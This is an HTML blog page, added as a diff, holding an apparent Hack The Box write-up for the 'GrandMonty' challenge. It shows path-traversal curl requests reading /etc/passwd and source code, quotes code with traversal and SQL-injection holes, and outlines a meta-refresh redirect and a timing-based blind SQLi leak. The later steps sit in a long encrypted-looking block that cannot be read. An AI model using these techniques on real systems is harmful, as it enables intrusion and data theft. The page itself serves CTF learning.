@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ZanyMonk | HTB - GrandMonty</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" />
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <link rel="icon" type="image/png" href="/assets/img/avatar.png">
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">ZanyMonk</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg
+      stroke="currentColor"
+      fill="currentColor"
+      stroke-width="0"
+      viewBox="0 0 16 16"
+      height="1.2em"
+      width="1.2em"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
+      ></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">HTB - GrandMonty</h2>
+          <small class="date">09 Aug 2024</small>
+          <div class="categories">
+            
+          </div>
+        </div>
+        <div class="content"><p>Submit the given “encryption ID” to access the chat: <code class="language-plaintext highlighter-rouge">1f81b076-fffc-45cd-b7c3-c686b73aa6af</code></p>
+
+<h2 id="lfi">LFI</h2>
+<p>The <code class="language-plaintext highlighter-rouge">/files/:file</code> endpoint accepts a parameter that gets url-decoded, and allows to traverse directories and read any file on the system, including the source code:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s1">'http://94.237.59.63:50433/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'</span>
+curl <span class="s1">'http://94.237.59.63:50433/files/%2e%2e%2findex.js'</span>
+</code></pre></div></div>
+
+<p>Here is the vulnerable endpoint in <code class="language-plaintext highlighter-rouge">routes/index.js</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/files/:file</span><span class="dl">'</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+	<span class="kd">const</span> <span class="p">{</span> <span class="nx">file</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">;</span>
+	<span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/../uploads</span><span class="dl">'</span><span class="p">,</span> <span class="nx">file</span><span class="p">));</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>And the recovered file structure:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├── bot.js
+├── database.js
+├── index.js
+├── package.json
+├── helpers
+│   ├── DecryptorHelper.js
+│   ├── GraphqlHelper.js
+│   └── JWTHelper.js
+├── middleware
+│   ├── AdminMiddleware.js
+│   └── PublicMiddleware.js
+├── routes
+│   └── index.js
+├── static
+│   └── js
+│       ├── admin.js
+│       ├── home.js
+│       ├── index.js
+└── views
+    ├── auth.html
+    ├── index.html
+    └── messages.html
+</code></pre></div></div>
+
+<h2 id="sqli">SQLi</h2>
+<p>The <code class="language-plaintext highlighter-rouge">database.js</code> file includes a fake flag, but indicates that the real one is stored as <code class="language-plaintext highlighter-rouge">burns</code>’ password in the MySQL database.
+Obviously we can’t read the raw database files using the LFI, it would be too easy !</p>
+
+<p>But this file also contains a function called by the <code class="language-plaintext highlighter-rouge">RansomChat</code> GraphQL query, that is vulnerable to SQLi, but accessible only from <code class="language-plaintext highlighter-rouge">127.0.0.1</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* helpers/GraphqlHelper.js */</span>
+<span class="nx">RansomChat</span><span class="p">:</span> <span class="p">{</span>
+    <span class="c1">// ...</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nf">isLocal</span><span class="p">(</span><span class="nx">request</span><span class="p">))</span> <span class="k">return</span> <span class="nf">reject</span><span class="p">(</span><span class="k">new</span> <span class="nc">GraphQLError</span><span class="p">(</span><span class="dl">'</span><span class="s1">Only localhost is allowed this query!</span><span class="dl">'</span><span class="p">));</span>
+        <span class="nx">db</span><span class="p">.</span><span class="nf">getRansomChat</span><span class="p">(</span><span class="nx">enc_id</span><span class="p">)</span>
+        <span class="c1">// ...</span>
+    <span class="p">});</span>
+    <span class="c1">// ...</span>
+<span class="p">},</span>
+
+<span class="cm">/* database.js */</span>
+<span class="k">async</span> <span class="nf">getRansomChat</span><span class="p">(</span><span class="nx">enc_id</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="k">async </span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">stmt</span> <span class="o">=</span> <span class="s2">`SELECT * FROM ransom_chat WHERE enc_id = '</span><span class="p">${</span><span class="nx">enc_id</span><span class="p">}</span><span class="s2">'`</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">connection</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span><span class="nx">stmt</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="c1">// ...</span>
+        <span class="p">})</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="xs-leak">XS-Leak</h2>
+<p>CSP have <code class="language-plaintext highlighter-rouge">script-src 'self'</code> which makes it possible to XSS if we can upload a file on the system.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* index.js */</span>
+<span class="c1">// almighty bonk</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">setHeader</span><span class="p">(</span>
+        <span class="dl">'</span><span class="s1">Content-Security-Policy</span><span class="dl">'</span><span class="p">,</span>
+        <span class="s2">`default-src 'none'; script-src 'self'; style-src 'self' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'; form-action 'self'; base-uri 'none'; connect-src 'self';`</span>
+    <span class="p">);</span>
+    <span class="nf">next</span><span class="p">();</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>Unluckily the upload feature is not implemented.
+The <code class="language-plaintext highlighter-rouge">express-fileupload</code> package that’s used could be interesting but it is configured not to write temporary files to disk so it’s useless to us.
+No upload, no XSS.</p>
+
+<p>But we can still use the good ol’ <code class="language-plaintext highlighter-rouge">&lt;meta&gt;</code> trick to redirect the victim to a malicious page we host:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0; url=http://zanymonk.github.io/"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>Chromium will disallow the script running on this page to access data from queries to the challenge’s domain, or to its loopback address. This makes it impossible to extract the flag in one go, using an Error-based SQLi for exemple.</p>
+
+<p>However, it can still query these domains, and compute the time it takes to get a response. We’ll use the SQLi as if we were exploiting it blind, and detect the <code class="language-plaintext highlighter-rouge">sleep(1)</code> using <a href="https://developer.mozilla.org/fr/docs/Web/API/Performance/now">Performance API</a>:</p>
+<p class="secret">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
+</p>
+</div>
+      </section>
+      <script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+    <script src="/assets/js/secret.js" defer></script>
+  </body>
+</html>
